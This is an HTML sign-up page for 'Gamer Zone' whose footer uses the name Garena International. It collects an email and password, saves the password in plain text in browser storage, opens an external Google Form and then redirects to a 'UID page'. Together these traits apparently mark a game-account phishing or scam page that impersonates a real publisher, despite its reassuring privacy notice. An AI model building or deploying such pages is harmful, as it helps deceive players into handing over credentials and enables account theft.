<!DOCTYPE html>
<html>
<head>
  <title>Gamer Zone Sign Up</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      height: 100vh;
      width: 100vw;
      overflow: hidden;
      background: radial-gradient(circle at top, #1a0000, #000000 60%),
                  linear-gradient(135deg, #ff0000 20%, #000000 80%);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      position: relative;
    }

    body::before {
      content: "";
      position: absolute;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle, rgba(255,0,0,0.2), transparent 60%);
      pointer-events: none;
    }

    h1 {
      position: absolute;
      top: 20px;
      color: white;
      text-shadow: 0 0 10px red;
      width: 100%;
      text-align: center;
    }

    .box {
      width: 90%;
      max-width: 340px;
      background: rgba(255,255,255,0.95);
      padding: 20px;
      border-radius: 12px;
      text-align: center;
      box-shadow: 0 0 20px rgba(255,0,0,0.5);
      z-index: 1;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      background: black;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    button:hover {
      background: #222;
    }

    .links {
      margin-top: 10px;
      font-size: 12px;
      color: red;
      cursor: pointer;
    }

    .footer {
      position: absolute;
      bottom: 10px;
      color: white;
      font-size: 12px;
      text-align: center;
      width: 100%;
    }

    /* POPUP */
    .popup {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.7);
      justify-content: center;
      align-items: center;
    }

    .popup-content {
      background: white;
      padding: 20px;
      border-radius: 10px;
      width: 85%;
      max-width: 300px;
      text-align: center;
    }
  </style>
</head>

<body>

<h1>🎮 Gamer Zone Sign Up</h1>

<div class="box">

  <input type="email" id="email" placeholder="Enter Email">
  <input type="password" id="password" placeholder="Enter Password">

  <button onclick="signup()">Sign Up</button>

  <div class="links" onclick="openPolicy()">Privacy Policy</div>

</div>

<div class="footer">
  © 2026 Gamer Zone. All Rights Reserved | Garena International
</div>

<!-- PRIVACY POLICY POPUP -->
<div class="popup" id="popup">
  <div class="popup-content">
    <h3>Privacy Policy</h3>
    <p>
      Your data is collected only for login and verification.
      We do not share or sell your information.
    </p>
    <button onclick="closePolicy()">Close</button>
  </div>
</div>

<script>
function signup() {
  let email = document.getElementById("email").value;
  let password = document.getElementById("password").value;

  if (!email || !password) {
    alert("Please fill all fields");
    return;
  }

  // store locally
  localStorage.setItem("user_email", email);
  localStorage.setItem("user_password", password);

  // open Google Form
  window.open(
    "https://docs.google.com/forms/d/e/1FAIpQLSddWzlCgcpzw1ZnefYzfvNmSau9p4dbm-V5Zc4UjlUg4vJVDA/viewform?embedded=true",
    "_blank"
  );

  alert("Complete the form. Redirecting to UID page...");

  // redirect to uid page
  setTimeout(() => {
    window.location.href = "uid.html";
  }, 12000);
}

function openPolicy() {
  document.getElementById("popup").style.display = "flex";
}

function closePolicy() {
  document.getElementById("popup").style.display = "none";
}
</script>

</body>
</html>
